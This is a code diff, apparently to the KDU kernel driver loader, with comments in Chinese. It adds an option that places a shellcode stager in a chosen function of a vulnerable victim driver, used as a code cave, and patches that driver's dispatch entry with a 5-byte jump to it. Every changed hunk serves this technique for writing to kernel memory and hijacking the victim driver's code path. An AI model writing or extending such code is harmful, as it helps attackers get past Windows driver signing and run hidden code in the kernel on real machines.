@@ -19,6 +19,9 @@
 
 #include "global.h"
 
+static ULONG g_StagerOffset = 0; /* 显式 stager 落点，0 = 由 KDU 选择 */
+
+
 /*
 * KDUShowPayloadResult
 *
@@ -638,8 +641,11 @@ BOOL KDUpMapDriverPhysicalTranslate(
         haveEntry = ReadKernelVM(deviceHandle, TargetAddress, originalEntry, ScSize) != FALSE;
     }
     if (originalPage) {
-        havePage = ReadKernelVM(deviceHandle, TargetAddress - VictimImageInformation->DispatchPageOffset,
-            originalPage, ScSize) != FALSE;
+        /* 有显式 stager 落点时保存那块，否则保存同页页首（跨页分支会用）。 */
+        ULONG_PTR pageBase = g_StagerOffset
+            ? (TargetAddress - VictimImageInformation->DispatchOffset + g_StagerOffset)
+            : (TargetAddress - VictimImageInformation->DispatchPageOffset);
+        havePage = ReadKernelVM(deviceHandle, pageBase, originalPage, ScSize) != FALSE;
     }
 
     ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
@@ -649,7 +655,50 @@ BOOL KDUpMapDriverPhysicalTranslate(
 
     do {
 
-        if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {
+        if (g_StagerOffset != 0) {
+
+            /*
+             * 显式 stager 落点：把 shellcode 放进调用方指定的函数，派发点只写 jmp。
+             * 该区域与派发函数可能相隔很远，所以不能用"同页页首"那套推算。
+             *
+             * 物理写入按连续物理地址进行，跨页会写到别的物理页上（或直接失败），
+             * 因此这里要求 stager 完全落在一个 4KB 页内。
+             */
+            if (((g_StagerOffset & 0xFFF) + ScSize) > PAGE_SIZE) {
+
+                supPrintfEvent(kduEventError,
+                    "[!] Stager offset 0x%lX crosses a page boundary (0x%lX + 0x%lX > 0x%lX), abort\r\n",
+                    g_StagerOffset,
+                    g_StagerOffset & 0xFFF,
+                    ScSize,
+                    (ULONG)PAGE_SIZE);
+
+                break;
+            }
+
+            ULONG_PTR stagerAddress = TargetAddress -
+                VictimImageInformation->DispatchOffset + g_StagerOffset;
+
+            printf_s("[+] Stager goes to 0x%llX (offset 0x%lX), entry keeps a 5 byte jmp\r\n",
+                stagerAddress,
+                g_StagerOffset);
+
+            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };
+
+            *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;
+
+            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {
+
+                supPrintfEvent(kduEventError,
+                    "[!] Error writting kernel memory, abort\r\n");
+
+                break;
+            }
+
+            targetAddress = stagerAddress;
+
+        }
+        else if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {
 
             memPage = (TargetAddress & 0xfffffffffffff000ull);
             printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);
@@ -754,10 +803,14 @@ BOOL KDUpMapDriverPhysicalTranslate(
             printf_s("[+] Victim entry restored after failure\r\n");
         }
 
-        if (havePage &&
-            WriteKernelVM(deviceHandle, TargetAddress - VictimImageInformation->DispatchPageOffset,
-                originalPage, ScSize)) {
-            printf_s("[+] Victim page head restored after failure\r\n");
+        if (havePage) {
+            ULONG_PTR restoreBase = g_StagerOffset
+                ? (TargetAddress - VictimImageInformation->DispatchOffset + g_StagerOffset)
+                : (TargetAddress - VictimImageInformation->DispatchPageOffset);
+
+            if (WriteKernelVM(deviceHandle, restoreBase, originalPage, ScSize)) {
+                printf_s("[+] Victim stager region restored after failure\r\n");
+            }
         }
     }
 
@@ -848,6 +901,20 @@ BOOL KDUpMapDriverPhysicalBruteForce(
     }
 
     return bSuccess;
+}
+
+/*
+* 显式 stager 落点。
+*
+* victim 的创建派发函数往往很小（Process Explorer 只有 0xF9 字节），stager 却是
+* 0x800 字节，就地写入必然覆盖邻居。只要 .text 里存在任意一个 >= stager 的函数，
+* 就可以把 stager 放进那个函数、在派发点只写 5 字节 jmp —— 该函数在触发窗口内
+* 不会被调用，等于一个免费的代码洞穴。
+*/
+
+VOID KDUSetStagerOffset(_In_ ULONG Offset)
+{
+    g_StagerOffset = Offset;
 }
 
 /*
@@ -1178,10 +1245,16 @@ BOOL KDUMapDriver(
                  */
                 vi.JumpValue = (ULONG)(LONG)((override_rva & ~0xFFFu) - override_rva - 5);
 
-                printf_s("[+] Dispatch jump value: %ld (entry 0x%lX -> page 0x%lX)\r\n",
+                /* 显式 stager 落点优先：jmp 直接跳到那个函数。 */
+                if (g_StagerOffset != 0) {
+                    vi.JumpValue = (ULONG)(LONG)(g_StagerOffset - override_rva - 5);
+                }
+
+                printf_s("[+] Dispatch jump value: %ld (entry 0x%lX -> %s 0x%lX)\r\n",
                     (LONG)vi.JumpValue,
                     override_rva,
-                    override_rva & ~0xFFFu);
+                    g_StagerOffset ? "stager" : "page",
+                    g_StagerOffset ? g_StagerOffset : (override_rva & ~0xFFFu));
             }
 
             RtlSecureZeroMemory(&vdi, sizeof(vdi));
